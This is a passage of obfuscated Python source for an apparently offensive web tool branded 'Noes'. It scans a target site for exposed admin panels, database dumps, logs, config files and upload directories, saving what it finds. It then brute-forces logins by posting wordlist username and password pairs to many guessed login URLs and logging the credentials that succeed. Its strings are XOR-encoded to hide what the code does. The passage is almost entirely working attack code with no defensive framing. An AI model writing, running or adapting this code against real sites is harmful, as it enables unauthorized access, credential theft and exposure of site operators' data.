        _1IO1O000OIOIOlI1I = [_0011111Il1O1llOllI(b'|\xbf\x18G\x00\x9e', b'Y>\xf1#'), _O01IIlOIlI(b'\x99\xfb@TD<\xc2\xfb\x1aH', b'\xc1\x01\x89j'), _0lOOII1IO1OlIllII(b'\xbdK\xda', b'\x0f\xf2\x1d\xe1'), _0lOOII1IO1OlIllII(b'\x96\x93\x98\xa7\xe7\xd0Y', b'\x8d\xf8\x92\xb0'), _O01IIlOIlI(b"\x00\x93\x80\xa9\xa3\xd7\x8b,'", b'\xebpYJ'), _0lOOII1IO1OlIllII(b'\xc4\x07\x07f:\x87\x10\xf1\xce\\\x1e\xd1"q', b'B\xe0D\x10'), _0011111Il1O1llOllI(b'\x02F\xe2e"\xb1\xbbl\xfb(\x0e', b'\x1b\x0b)\x88'), _O01IIlOIlI(b'~c\xf4\xb2\xacj\x88\xe6\xd0\x15\x07.\xff', b'U\x04\x1d\x01')]
        if any((admin in path for admin in _1IO1O000OIOIOlI1I)):
            if status in [1288071214 ^ 1288071398, 1336677067 ^ 1336677349, 1834779222 ^ 1834779589]:
                _1O11IOlI0l0I0IOI = True
                vuln_type = _11OO0OO1llIlI(b'\xa5\x81Y\xbe\xbb}\xa2\x01B\xa9\xb9', b'M:J\x9a')
                severity = _O01IIlOIlI(b':J\xb4\x7f', b'"m\xd0\xaa')
                _lIlOI1IOl00III11II(f'[Noes] ADMIN PANEL: {target}', _0lOOII1IO1OlIllII(b'!\xba\xecQ', b'\xf9\xea\xfd2'))
        if _0011111Il1O1llOllI(b'\xe7\xb8\xe7r\x0b', b'Wi\xf5\xfc') in path or _O01IIlOIlI(b'\x906>\x16', b'Sy\x7f\xc3') in path or _0011111Il1O1llOllI(b'\n\xe6>z', b'\x92\xa5x\xb0') in path:
            if status in [1294511195 ^ 1294511251, 2095043169 ^ 2095043568, 1561316227 ^ 1561315856]:
                _1O11IOlI0l0I0IOI = True
                vuln_type = _0lOOII1IO1OlIllII(b'\xb5\x97\xf4\xd9#\\\xfa\x18(w\xcc\xaa', b'\xa9\xe4\xc0$')
                severity = _0011111Il1O1llOllI(b'\xeb}\x9f\xc5\x84\xb4', b'/l\xa7c')
                if status == 1956091931 ^ 1956092115:
                    _OllO00Il1OlOOl1O(target, r.text[:752218145 ^ 752221081], _0lOOII1IO1OlIllII(b'\x0f\x8fp', b'\x08\xe9JI'))
                    _lIlOI1IOl00III11II(f'[Noes] API: {target}', _11OO0OO1llIlI(b'\xb1\x07Q.', b'\xd5Y\xa9\xc4'))
        _0lOO0IIIIOl1l1010l = [_0011111Il1O1llOllI(b'\xef7\x19', b'\xc3H\x81"'), _0011111Il1O1llOllI(b';\xba\x06\x7f\xeb\xab\x87', b'1\x7fA\xa6'), _0lOOII1IO1OlIllII(b'\x855.\xc7q0\x80Q', b'\x9b+\xf3S'), _0lOOII1IO1OlIllII(b'\x9f^\xc4\xb5', b'o\xdc\xb6u'), _11OO0OO1llIlI(b'\xcb\xc3O%', b'\xa1-\xa39'), _11OO0OO1llIlI(b'\xdb\xe6\x9f\xda*\xef', b'\x82\xbd\x96\x15'), _O01IIlOIlI(b'\x8e\xf5\xa2\xaf', b'\x1c\xfe\xa3\xb4')]
        if any((path.endswith(e) for e in _0lOO0IIIIOl1l1010l)):
            if status == 402369861 ^ 402369933 and size > 2032109880 ^ 2032109880:
                _1O11IOlI0l0I0IOI = True
                vuln_type = _0lOOII1IO1OlIllII(b'\x9d\x91\x05\xb0\xe3|Y\xc5\xe5\xdbte\xb7', b'\xdf\x98.n')
                severity = _O01IIlOIlI(b'(\xfc\xb1\x9f<\xffh\x1e', b'\x05Z\xa7\x90')
                _OllO00Il1OlOOl1O(target, r.text[:212074384 ^ 212071464], _0lOOII1IO1OlIllII(b'=\xa6O\xd7K\xf8\xf4D', b'\x01`{\x0f'))
                _lIlOI1IOl00III11II(f'[Noes] DATABASE: {target}', _O01IIlOIlI(b'\xaf?D\xb5', b'yb\xe9\xec'))
        if _O01IIlOIlI(b'z\t\xc7J', b'\xdb\xad7\x11') in path or path.endswith(_O01IIlOIlI(b'\x0e\x80\xaa\xf2', b'\xd2\x92\xaal')):
            if status == 2099417258 ^ 2099417186 and size > 1555209672 ^ 1555209672:
                _1O11IOlI0l0I0IOI = True
                vuln_type = _O01IIlOIlI(b'a\x86h\xb3\x16\xfeZH', b'%\xa1\x9b\x16')
                severity = _O01IIlOIlI(b'\r\xd8\x90\x13\x08X', b'QM2\n')
                _OllO00Il1OlOOl1O(target, r.text[:946092538 ^ 946090562], _0011111Il1O1llOllI(b'D\x9a\xab', b'\x82L\xc75'))
                _lIlOI1IOl00III11II(f'[Noes] LOG: {target}', _0lOOII1IO1OlIllII(b'*\x07\x1eo', b'\xa5J\x12\xc0'))
        _0OI0lO00IllIOl = [_O01IIlOIlI(b'\x0e\xe0\xa8;', b'\xd7\xc3\x13F'), _0lOOII1IO1OlIllII(b'\xdb\x0b*t\xbe', b'ca\x13?'), _0lOOII1IO1OlIllII(b'1\x8e\xca\xba', b'\xda\x17(_'), _11OO0OO1llIlI(b'\x11\x83\x9c\xbf\xf4G\xc2\x104\xb5\xf5', b'\x85\xe4\xaa\xbc'), _O01IIlOIlI(b'\xfc\xd5`v2', b'O\xa6\xcb\xec'), _11OO0OO1llIlI(b'x\x95\xa6\x1a', b'\x0b#]\xf1'), _O01IIlOIlI(b'\xbfHg\xa7', b'\x8cc\x82d')]
        if any((path.endswith(e) for e in _0OI0lO00IllIOl)):
            if status == 1423610215 ^ 1423610287 and size > 895994194 ^ 895994194:
                _1O11IOlI0l0I0IOI = True
                vuln_type = _0011111Il1O1llOllI(b'v\x1ck\xd2\xb4A\x88\xf4\xc2\x9c\xc2', b'9\xa1D\n')
                severity = _0011111Il1O1llOllI(b'\xb8x\x9a\x9b', b'v\x044\xa1')
                _OllO00Il1OlOOl1O(target, r.text[:303729899 ^ 303728467], _0011111Il1O1llOllI(b'\x97\xb9\xefr\xd5:', b'\x934\xac\x06'))
                _lIlOI1IOl00III11II(f'[Noes] CONFIG: {target}', _0011111Il1O1llOllI(b'\x85\x10k\xe1', b'\xfd\x98\xe0\xc7'))
        _0I111I1Il0lO = [_11OO0OO1llIlI(b'\xc5\xb9G\xa7\xd4\xa2\xaeHK', b'\xb2\x0f,\xea'), _0lOOII1IO1OlIllII(b'oR&!\x81nB\xec', b'\\U\x91\xec'), _11OO0OO1llIlI(b'CoL\x824\x9d%', b'\xf0\xf1\x17\xbf'), _0011111Il1O1llOllI(b'\x1c*\x02Fq\xa6G\x89', b'\xefy\xc0\xe8'), _O01IIlOIlI(b'\x92=\x01\x1f\xab}\x11', b'\x87e\x95\x1d')]
        if any((up in path for up in _0I111I1Il0lO)):
            if status == 1347409960 ^ 1347410144:
                _1O11IOlI0l0I0IOI = True
                vuln_type = _0011111Il1O1llOllI(b'\x9e\xfb\x93K\xce\x13G\x15\x83\x95F\x1f\xf3\x17\xac\x92', b'\xe7\x160\x18')
                severity = _O01IIlOIlI(b'!\xfe\x9f2\x1d\xd8', b'\xaf$\xb8\x92')
                _lIlOI1IOl00III11II(f'[Noes] UPLOAD DIR: {target}', _0011111Il1O1llOllI(b'\xe6*\xb78', b'\x10\x95\xfb\x8d'))
        _l0O01ll0IIOOI0OllI = [_0011111Il1O1llOllI(b'N0\x99\x04\xdb', b"'\xab#\x93"), _11OO0OO1llIlI(b'\xeb\xca \xb4\x91\xad', b'[\x8c\xd9P'), _0lOOII1IO1OlIllII(b'T:Z$\x8e\xf4x', b'\xfdB\xb95'), _11OO0OO1llIlI(b'\xe6\xee\xfb\x18\x03\xa5\xbblb\x85', b'^\xa8K{')]
        if any((tmp in path for tmp in _l0O01ll0IIOOI0OllI)):
            if status == 2124216937 ^ 2124216993:
                _1O11IOlI0l0I0IOI = True
                vuln_type = _0011111Il1O1llOllI(b'\xf9\xe2/\xd1\xe7\xfcB\xd4\xb4O1\x80\xb7\xa6', b'|\xaed\xe8')
                severity = _0lOOII1IO1OlIllII(b'\xbfy\xae', b'\x99\x8b\x02\xfa')
                _lIlOI1IOl00III11II(f'[Noes] TEMP DIR: {target}', _0lOOII1IO1OlIllII(b'\xd4\xd5\xee\xbc', b'\x84vY+'))
        if _1O11IOlI0l0I0IOI:
            _lIlOI1IOl00III11II(f'[{severity}] {target}', _0lOOII1IO1OlIllII(b'\x08\x03\x11\x0c\xdd', b'\x8e\x13\xa4\x00'))
            _O1lIlOI010lllO = {_0lOOII1IO1OlIllII(b'\x99\xc0\xf4', b'ijg\xce'): target, _0lOOII1IO1OlIllII(b'\xea\xc2\x03:\xceU\xcb\xbb', b'\x86~\xe6('): base_url, _O01IIlOIlI(b'r|$\x90', b'V\xfa,\xe9'): path, _11OO0OO1llIlI(b'\x85\x8a\xbfShb', b'8\x8a\x1b\x0f'): status, _0lOOII1IO1OlIllII(b'\xbb\xb9\xfam', b'\t\xc2\xe4\xb6'): size, _O01IIlOIlI(b'\xff\xeatl\xb7\xa7\xa4\xb1\x92', b'=\xc2\xd4\xaf'): vuln_type, _11OO0OO1llIlI(b',8Kv\x1cq\xcb\xb8', b'\x16)ER'): severity, _0lOOII1IO1OlIllII(b'\xcb\x1c2\xf0\xf4\xfe\xfe=\x95', b'3\xa0\x17k'): _IO1111llIOOO11l(), _O01IIlOIlI(b'R\xb07=k\xdcl!\xa8\xa9\xcc\xf5', b'\xfa\x15U_'): content_type}
            with _l1lI0001I1OOIIl00:
                _lO1lO1111l.append(_O1lIlOI010lllO)
                _OIl1OOIO11[_0011111Il1O1llOllI(b'4\xb8\xa3>{', b'\xa1v\x8d\x91')] += 445956220 ^ 445956221
                _OIl1OOIO11[vuln_type] = _OIl1OOIO11.get(vuln_type, 114370148 ^ 114370148) + (1701813437 ^ 1701813436)
                _OIl1OOIO11[f'sev_{severity}'] = _OIl1OOIO11.get(f'sev_{severity}', 1745204073 ^ 1745204073) + (504668236 ^ 504668237)
            return _O1lIlOI010lllO
        return None
    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.SSLError:
        pass
    except Exception:
        pass
    return None

def _l001llOOllO1l(base_url, threads=_1O0llO01lIllIl1l1):
    global _I1O1I10lO01O, _lO1lO1111l
    _I1O1I10lO01O = True
    _lO1lO1111l = []
    _OIl1OOIO11.clear()
    if not base_url.startswith((_11OO0OO1llIlI(b'\x94^\x9c\x8f\xb80\xe3', b'\xf9\xe6D_'), _11OO0OO1llIlI(b'\xd4\x91\x8f?ISl\xef', b'*cKI'))):
        base_url = _0011111Il1O1llOllI(b'"\x1b\x14\xb8Z\x8e\x1b', b'\x05\xf0\xac*') + base_url
    if not base_url.endswith(_O01IIlOIlI(b'\x8d', b'\x11\xe4\x87\xa7')):
        base_url += _11OO0OO1llIlI(b'-', b'\x80\x9a.:')
    _lIlOI1IOl00III11II(f'\n[Noes] SCAN START: {base_url}', _0011111Il1O1llOllI(b'\xe4:\xa5\x80', b'B\xd7^\xa5'))
    _lIlOI1IOl00III11II(f'[Noes] Payloads: {len(_l1OlOI1I0OlI1OI0lO)} | Threads: {threads}', _0lOOII1IO1OlIllII(b'\xc0\x8bPD', b'H\x1fK\xb5'))
    _lIlOI1IOl00III11II(f'[Noes] Categories: 12', _11OO0OO1llIlI(b'\xac\x8e\xf8\xe6', b'\xb6\xff\xf0G'))
    try:
        r = _1000III00l00OOOII.get(base_url, timeout=1408010685 ^ 1408010680, verify=False)
        _lIlOI1IOl00III11II(f"[Noes] Target OK | Status: {r.status_code} | Server: {r.headers.get('Server', 'Unknown')}", _0lOOII1IO1OlIllII(b'L`\x15\x06eo~', b'\x18*\x17\xb4'))
    except Exception as e:
        _lIlOI1IOl00III11II(f'[Noes] Target unreachable! {str(e)[:50]}', _11OO0OO1llIlI(b'1\xa1\xd0\xe7\xc8', b'\xf4Hx,'))
        _I1O1I10lO01O = False
        return
    _1lO1O1I01IllO0I = []
    total = len(_l1OlOI1I0OlI1OI0lO)
    _O1IO0OI1OI0OO11O0 = time.time()
    for _O001Ol011I0I, _0III1lOOO11Ill0 in enumerate(_l1OlOI1I0OlI1OI0lO):
        t = _11Oll00ll1OII00.Thread(target=_OIll00lO000OOlI1OI, args=(base_url, _0III1lOOO11Ill0))
        t.daemon = True
        t.start()
        _1lO1O1I01IllO0I.append(t)
        if _O001Ol011I0I % (1718522403 ^ 1718522385) == 1237031040 ^ 1237031040 and _O001Ol011I0I > 479686691 ^ 479686691:
            progress = int(_O001Ol011I0I / total * (302281805 ^ 302281769))
            elapsed = int(time.time() - _O1IO0OI1OI0OO11O0)
            _lIlOI1IOl00III11II(f'[Noes] Progress: {progress}% ({_O001Ol011I0I}/{total}) | Elapsed: {elapsed}s', _11OO0OO1llIlI(b'\xbdK;z\xc5', b'\x0e#]\xaf'))
        time.sleep(0.005)
    for t in _1lO1O1I01IllO0I:
        try:
            t.join(timeout=1645994613 ^ 1645994615)
        except:
            pass
    _I1O1I10lO01O = False
    elapsed = int(time.time() - _O1IO0OI1OI0OO11O0)
    _lI00l1llOO.append({_0011111Il1O1llOllI(b'uL4\x0b\x9d\x1c', b'In\xbf~'): base_url, _O01IIlOIlI(b'j}\xe5\xe8C c+\x12', b'\xd1<\x03\x04'): _IO1111llIOOO11l(), _11OO0OO1llIlI(b'~\xef\xe2SH', b'D\xd1P\x82'): len(_lO1lO1111l), _0011111Il1O1llOllI(b'Z\xd5\x14A\x10F\r', b'\x81BI\xf0'): elapsed})
    _lIlOI1IOl00III11II(f'[Noes] SCAN COMPLETE - Found: {len(_lO1lO1111l)} | Time: {elapsed}s', _0011111Il1O1llOllI(b'\x82=Gr\xd1\xa6\\', b'\x9a\xce\x11\xc8'))
    if _lO1lO1111l:
        _lIlOI1IOl00III11II(f'[Noes] SUMMARY:', _0011111Il1O1llOllI(b'\xf8\xb1\x05\x02', b'\xf6\x01\xa8\x07'))
        for _1III1llOII0IlOOlO in [_O01IIlOIlI(b'&uj\x86\xa6\x1dGa', b'\xb4\xe1&s'), _O01IIlOIlI(b'C\xf1\xadv', b'\xc9[\xf6\xb9'), _0011111Il1O1llOllI(b'\x12+C} \xb1', b'\xd0- \xa0'), _11OO0OO1llIlI(b'BF\x0c', b'\x95\x8e\xbeS')]:
            _1Ol0000OO1 = _OIl1OOIO11.get(f'sev_{_1III1llOII0IlOOlO}', 1702981546 ^ 1702981546)
            if _1Ol0000OO1 > 169511456 ^ 169511456:
                color = _Olll0O10Il0O1010I.RED if _1III1llOII0IlOOlO == _11OO0OO1llIlI(b'62 ~\xd7u\xe2g', b'\x92/\xdd\xd0') else _Olll0O10Il0O1010I.YELLOW if _1III1llOII0IlOOlO == _O01IIlOIlI(b'\xb0o\xe1\xae', b'\xf9\x8eha') else _Olll0O10Il0O1010I.CYAN
                _lIlOI1IOl00III11II(f'  {color}{_1III1llOII0IlOOlO}: {_1Ol0000OO1}', _11OO0OO1llIlI(b'f\xdc\xcd\xd0', b'\xe7\xe4\xec\xbd'))
        _lIlOI1IOl00III11II(f'[Noes] TYPES FOUND:', _0011111Il1O1llOllI(b'\xb9\x87v\xa6', b'D\x1e\xec\x87'))
        for _OOI1lI101l11l, _1Ol0000OO1 in _OIl1OOIO11.items():
            if not _OOI1lI101l11l.startswith(_11OO0OO1llIlI(b'\xd8\xc3:,', b'7C\xcd\xe2')) and _OOI1lI101l11l != _O01IIlOIlI(b'[\xc0\x92,z', b'\x91g\xc1\xc0'):
                _lIlOI1IOl00III11II(f'  • {_OOI1lI101l11l}: {_1Ol0000OO1}', _11OO0OO1llIlI(b'\xa4/\xa6x', b'\xf3\xf2D\xbb'))
    _OOl0l1llO110()

def _1lIllI1I11O11(base_url, username, password):
    _O1lI11I1O00 = [_0IOI01O1I1l0(base_url, _O01IIlOIlI(b'\xec\x0c\x94\xf4\x88\x86Z\xf92\xd5\x9d:', b':`\xe3\xa0')), _0IOI01O1I1l0(base_url, _0011111Il1O1llOllI(b'c\xd6a0\x9fW', b'\xb9\x90~\xaf')), _0IOI01O1I1l0(base_url, _0011111Il1O1llOllI(b'l\xbd\xa6\xff\xff<\x04\x86\x9cU\x97H\xb7', b'~\xc9\x97\x86')), _0IOI01O1I1l0(base_url, _O01IIlOIlI(b'i\xf4?|4z5\x8d\x13\x1e\xd1\xfeP\xb6\xcc\x1aa\xee\x19+2\x9fU\xe3', b'yvJ\x92')), _0IOI01O1I1l0(base_url, _0lOOII1IO1OlIllII(b'^S\xba\xfa\xec\x13]\x8eI^#\x89\xb6\xd7\xa3\xc1', b'\xf8/\xf9\xaa')), _0IOI01O1I1l0(base_url, _0lOOII1IO1OlIllII(b'\xf6\xf8tY)\x8d#\x1d\xff)\xcd', b'\xa4\x05\xe1}')), _0IOI01O1I1l0(base_url, _0lOOII1IO1OlIllII(b"w\xf0\xb5v\xd0\x01d'\x0f\xdd", b'\xbdb\x88\x97')), _0IOI01O1I1l0(base_url, _0lOOII1IO1OlIllII(b'\xbd\xbc?i\x8aS3', b'\x98\xd7\xd6\xc9')), _0IOI01O1I1l0(base_url, _0lOOII1IO1OlIllII(b'\x7f\xa5`\x89%\x9b\xd3S\x1a\x9e\xac\xc8S`\xc1\xfc', b'\xfd8\x91\x87')), _0IOI01O1I1l0(base_url, _O01IIlOIlI(b'\x82{\xdf[M\x86\x82{\x1a\x9a\xc2', b'x\x15S\xa5')), _0IOI01O1I1l0(base_url, _O01IIlOIlI(b'\x0b\xfd\x08\xd5\x04)\x8e\xd2\xd6\x91\xd0\xc7\x82', b'7\xd9\xa8\x89')), _0IOI01O1I1l0(base_url, _0lOOII1IO1OlIllII(b"\xd1D\xee\xee;uR.'", b'*\xae\xf8\xca')), _0IOI01O1I1l0(base_url, _O01IIlOIlI(b'\xb1q\xd8\xc0U\xfd', b'\xf1>!\xae')), _0IOI01O1I1l0(base_url, _0011111Il1O1llOllI(b'\xee\xb22\x07\xf9[ \x84\xe9\xb4&wj\xd3A<\x91', b'0\xff$\xc5')), _0IOI01O1I1l0(base_url, _0lOOII1IO1OlIllII(b'\x1e\xac\xee\xa4d\xab', b'P"\x97\xc5')), _0IOI01O1I1l0(base_url, _0011111Il1O1llOllI(b'\xe3&L\x99\xf2\xda=\x80', b'\xbb_\xcex')), _0IOI01O1I1l0(base_url, _0lOOII1IO1OlIllII(b'\x18b\x9aw\t-V$\xe6\xc6\x11\xf8', b'Fu\xac\xf3')), _0IOI01O1I1l0(base_url, _O01IIlOIlI(b'\x14\x8f\x84\xc2\xe5\x87\xc6\x8f0\xff\x13\x1c', b'\xf2\xe6\xc1\xf3')), _0IOI01O1I1l0(base_url, _O01IIlOIlI(b'\xce\x07\xbeV\xa4\x8a\xc1\x8a1\x9c\xf7\x88\x97\r', b'F\xa7\x1eW'))]
    _01I1Ol0l0l0ll1I = [{_0011111Il1O1llOllI(b'[\x0f\xceW\xcd\xdd\t\xe9', b'\xfb\x06\xd8W'): username, _O01IIlOIlI(b'\x16\xb2F`\xec\x1f\xd2\xbf', b'\xd8\xd9\x8f\x17'): password}, {_11OO0OO1llIlI(b'1\xd0\xf3Z', b'\xd0\x0bL\xb5'): username, _11OO0OO1llIlI(b'\xdc\xec*\xfb', b'\x81\xd5\xd2\xa0'): password}, {_11OO0OO1llIlI(b'u\x0b\xa8\x7f\x11\x82\xfbAe:', b'q\x90\x14\xae'): username, _11OO0OO1llIlI(b'Nm\xec&\xaa\xc6)X\xdd', b'\xb4S\x04\x98'): password}, {_O01IIlOIlI(b'l\xee\xdf', b'\x97\xa4\x14\xce'): username, _0lOOII1IO1OlIllII(b'/a\x0e', b'\xed\xd4\x1c\xfd'): password}, {_0011111Il1O1llOllI(b'\xc0\x9a\x0fk\xb7', b'\x9c\xdb\xa9y'): username, _0lOOII1IO1OlIllII(b'\xec<>od\xe5}P', b'\xd9\xd4\xa9\x9d'): password}, {_0lOOII1IO1OlIllII(b'H\xd2\xf0\xd8\xd5', b'_\xca\xe5\xf9'): username, _11OO0OO1llIlI(b'A.\xfe\xfc\xda', b'\xd81\xce\xf9'): password}, {_O01IIlOIlI(b'&\xb5\x96\xa51', b'4<\xb3a'): username, _0lOOII1IO1OlIllII(b'\x89\xcd|\x81', b'E\x7f\x80x'): password}, {_0lOOII1IO1OlIllII(b'u', b'\x811\x7ff'): username, _11OO0OO1llIlI(b'\x8f', b'\xe0\x8e\x80N'): password}, {_O01IIlOIlI(b'4\x90m\xd7\xf1\xe7\xa3\xe8\xa4', b'k\xe3d\xf7'): username, _O01IIlOIlI(b'\xdeK\xf1\xff\xa4\x8a\x0e0\xa1\xfa\xaa\xfa"', b'\xf2\xbe\xf4>'): password}, {_0011111Il1O1llOllI(b'8cY\xd5\\\xc7', b'\xbf\x83\xd1\xd5'): username, _11OO0OO1llIlI(b'bu\x99S)\x8b', b'\xdfu\x95\x83'): password}, {_0lOOII1IO1OlIllII(b'du\x00', b'\x91\xc3\xfa\xdc'): username, _O01IIlOIlI(b'D\x0eb', b'/\xb3\xcc\x81'): password}, {_O01IIlOIlI(b'>G\x91[', b'\xdb\xfa\xa2\x1a'): username, _11OO0OO1llIlI(b'r?\xa0p', b'\xab\x9d\xdb)'): password}, {_O01IIlOIlI(b'\xd6;\xff\xd9\xd7V\x15\x03\xc3\xa5', b'\x99/-E'): username, _O01IIlOIlI(b'\xc9\x0fw\xb3\x9e\xba\xcf\xe6', b'r\x98`\xbc'): password}, {_0011111Il1O1llOllI(b'\xf8\x96q""N\xe9\xd4', b'\x87r\xb1\x9c'): username, _11OO0OO1llIlI(b'\x83\xc3B\xae\x0bA', b'\xd4\xd9fs'): password}]
    for login_url in _O1lI11I1O00:
        try:
            for data in _01I1Ol0l0l0ll1I:
                r = _1000III00l00OOOII.post(login_url, data=data, timeout=1371482039 ^ 1371482034, allow_redirects=False, verify=False)
                if r.status_code == 689777141 ^ 689776859:
                    _11l1OIl0100IlOl = r.headers.get(_O01IIlOIlI(b')\x10G\x13\x9f83\xd9', b'a\xa0\xcd\xbf'), _O01IIlOIlI(b'', b'\x18\xa7ng'))
                    if any((w in _11l1OIl0100IlOl.lower() for w in [_O01IIlOIlI(b'\x7f\xd4\xe2~\xa0\xca\x0fOk', b'YQ`\x14'), _11OO0OO1llIlI(b'\xf4\x95_\xc4\x07', b'\xdd\xa8\xe9\xbe'), _O01IIlOIlI(b'\x0e\xcd!\x11', b'\xdf;\xef\xbd'), _0011111Il1O1llOllI(b'*R}\xd7v', b'\xac{\xc0['), _O01IIlOIlI(b'\xf6\x9e\x0cI\x15GA', b'\xd1\xea_p')])):
                        return {_11OO0OO1llIlI(b'a\xf8\xc1\xf5\x07\xdb\x1b', b'^:\\N'): True, _0011111Il1O1llOllI(b'\xc5\x11lM\x8e\x181q', b'N%\xb3&'): username, _11OO0OO1llIlI(b'\xac\x95\xe4=2\xa9\xea\x18', b'\x07M\x83t'): password, _0lOOII1IO1OlIllII(b'x\xf1\xc1', b'yU\xef\xdc'): login_url}
                if r.status_code == 1086141348 ^ 1086141292:
                    content = r.text.lower()
                    _OI1I1l0O00O1OI1Ol0 = [_0lOOII1IO1OlIllII(b'\xf7[\x8d\xb3\xe5\x910', b'\xc2\xa3\xc9\xc6'), _11OO0OO1llIlI(b'P\x1f\xbdM\xf0\xa2\xfe;\xa7', b'\xde\xe9\xef\x8e'), _O01IIlOIlI(b'\xbe\xda\x18MWU', b'\xbb\x90\xd7&'), _0011111Il1O1llOllI(b'\xdd\x9bF\xa7c', b'r\xbb=\xb4'), _11OO0OO1llIlI(b'H\x88\x90h\xd5c\x92', b'j\xeb\x1c\x15'), _0011111Il1O1llOllI(b'\x80lz\xcf@', b'O[\xd4V'), _0011111Il1O1llOllI(b'\x95\x90\x0bn', b'a\x90\xce\xf3')]
                    _OI00011IOl1ll1l = [_O01IIlOIlI(b'\x03\x19e\xb5\xf5\xa3R', b'I\x10\x89A'), _O01IIlOIlI(b'\xca\xe1\n)I\x87^W\xe5', b'\x1eh]\xb6'), _0011111Il1O1llOllI(b'\x16\xc3N\x0b{', b'\xf0ZLX'), _O01IIlOIlI(b'n\xea\xb5\xc0a\xc6', b'\xaeq,\xc1'), _O01IIlOIlI(b'\x8d\xa5\xafq\xd5', b'\xbd]\x01\xd6'), _O01IIlOIlI(b'\xcfx\x95\xb6\xd1\xcc', b'\x0c\x12\x1bZ'), _0lOOII1IO1OlIllII(b'\x9eM~\x08j\x17\x9f', b'\xe1Q\x06\xd2')]
                    if any((w in content for w in _OI1I1l0O00O1OI1Ol0)):
                        if not any((e in content for e in _OI00011IOl1ll1l)):
                            return {_11OO0OO1llIlI(b'n\x7f\xf1\xad\x99\xb4\xd9', b'x\xc9M6'): True, _0011111Il1O1llOllI(b'k\xe25\xfeS\xba3\xad', b"5\xbd\x1b'"): username, _0lOOII1IO1OlIllII(b'\xbb\xe13\x1d\xcdf\xc4q', b'\xc45\xff\x86'): password, _11OO0OO1llIlI(b'\xc2&\xaf', b'\xe5\xceeC'): login_url}
        except:
            continue
    return {_0lOOII1IO1OlIllII(b'G\x06\xc4\xd2}\xdb~', b'\x08Q\x9a\xce'): False}

def _00010001I0OO10OlOl(base_url):
    global _IO0lll0OII0O, _110111IIlll11OlI
    _IO0lll0OII0O = []
    _110111IIlll11OlI = {_0011111Il1O1llOllI(b'W\x96L\xf1X\xd6\xa4', b'm%[\xee'): 1973334776 ^ 1973334776, _0011111Il1O1llOllI(b'\xe7\xbeE(\x95', b'\xd8\x8dy\xbd'): len(_Il11Ol00OIlO0IlI00) * len(_1O0000llII1Il), _11OO0OO1llIlI(b'\xba\x85\xe0\xe7y', b'3\x95\x03\x7f'): 360099963 ^ 360099963}
    if not base_url.startswith((_O01IIlOIlI(b'MBz\xe2\x1cn\x18', b'\x13\xdcl\x10'), _0lOOII1IO1OlIllII(b'\xf5\x08H*\xf6\x98\x13\xe2', b'\xfd\x10\x95<'))):
        base_url = _O01IIlOIlI(b'\x0e\x12og{C\xc8', b'\x03\xb5>\xf3') + base_url
    if not base_url.endswith(_0011111Il1O1llOllI(b'\x80', b'"\xfcEF')):
        base_url += _0lOOII1IO1OlIllII(b'\xf5', b'O!\xcf\xb1')
    _lIlOI1IOl00III11II(f'\n[Noes] BRUTE FORCE START: {base_url}', _0lOOII1IO1OlIllII(b'\xda\xdc\x16\x06\x85', b'5\xdc\x94\x1d'))
    _lIlOI1IOl00III11II(f'[Noes] Usernames: {len(_Il11Ol00OIlO0IlI00)}', _0lOOII1IO1OlIllII(b'U\xbc\xc7\x85\x8e', b'\xa1\xad7;'))
    _lIlOI1IOl00III11II(f'[Noes] Passwords: {len(_1O0000llII1Il)}', _0lOOII1IO1OlIllII(b'u/\xb6!&', b'\x1a\xc4\xaaQ'))
    _lIlOI1IOl00III11II(f'[Noes] Total: {len(_Il11Ol00OIlO0IlI00) * len(_1O0000llII1Il)} combinations', _0011111Il1O1llOllI(b'+v\xca\xcf\x86', b'I\x85\xd7N'))
    _lIlOI1IOl00III11II(f'[Noes] This will take time... Stay patient', _0lOOII1IO1OlIllII(b'C\xc2\xa6\x88\x0f&\xdd', b'|?\xcb>'))
    found = []
    tested = 1649322250 ^ 1649322250
    total = len(_Il11Ol00OIlO0IlI00) * len(_1O0000llII1Il)
    _lI1lOOl1I0OllOOl = time.time()
    for username in _Il11Ol00OIlO0IlI00:
        for password in _1O0000llII1Il:
            tested += 63706767 ^ 63706766
            _110111IIlll11OlI[_0011111Il1O1llOllI(b'%\xe2\xf6\x1d0\xb1\x97', b'\xb5\x9fYl')] = tested
            if tested % (82190092 ^ 82190184) == 386033975 ^ 386033975:
                elapsed = int(time.time() - _lI1lOOl1I0OllOOl)
                _0Ol110100l1101l = int(tested / total * (1255845866 ^ 1255845774))
                _OIO00llOlOlIllllI = len(found)
                _lIlOI1IOl00III11II(f'[BRUTE] Progress: {_0Ol110100l1101l}% ({tested}/{total}) | Found: {_OIO00llOlOlIllllI} | Elapsed: {elapsed}s', _0lOOII1IO1OlIllII(b'/\x9f! .', b'\x8f\xb1\xc5\xe0'))
            _00lIII1lO1OO = _1lIllI1I11O11(base_url, username, password)
            if _00lIII1lO1OO.get(_11OO0OO1llIlI(b'\x93J\x9c\xf3p\xcb\x85', b'+2?$')):
                _OIOI1I1OlO = {_0lOOII1IO1OlIllII(b'\xc7\xb5\x9d', b'\x8eQb\xef'): base_url, _11OO0OO1llIlI(b'\x7f\xad7\x1e^\xa9\x05\x84', b'\xcf\x8ay\xa0'): username, _O01IIlOIlI(b"\x18\xcb\xd7r'VQ7", b'6\xb3\xca\x8f'): password, _O01IIlOIlI(b'\xa5\xde\xefm\xfd\xa4\x03`M', b'\xcc\xd5-\x99'): _00lIII1lO1OO.get(_11OO0OO1llIlI(b'\xcbW\x8a', b'\x08|\xe5\xbe')), _0lOOII1IO1OlIllII(b'_[\x89\xa8\x0f\x96\x95\xcb\xb9', b'\xf4\xef\xc6T'): _IO1111llIOOO11l()}
                _IO0lll0OII0O.append(_OIOI1I1OlO)
                found.append(_OIOI1I1OlO)
                _110111IIlll11OlI[_0011111Il1O1llOllI(b'\xaaA\xc6\xa1\xa1', b'\x7fp\x8f\xe0')] = len(found)
                _lIlOI1IOl00III11II(f"[Noes] ✅ BRUTE SUCCESS: {username}:{password} @ {_00lIII1lO1OO.get('url')}", _11OO0OO1llIlI(b'\x9f\x10)V\xa8\xf3\xce\x01\x93\xd9\xb4\xfbk', b'\x10\x99R\xfd'))
                _OOl0l1llO110()
                try:
                    _lllI101I00I0IIl = _1lIllI1I11O11(base_url, username, password)
                    if _lllI101I00I0IIl.get(_11OO0OO1llIlI(b'3W:<O\t\\', b'~\x94-\xc7')):
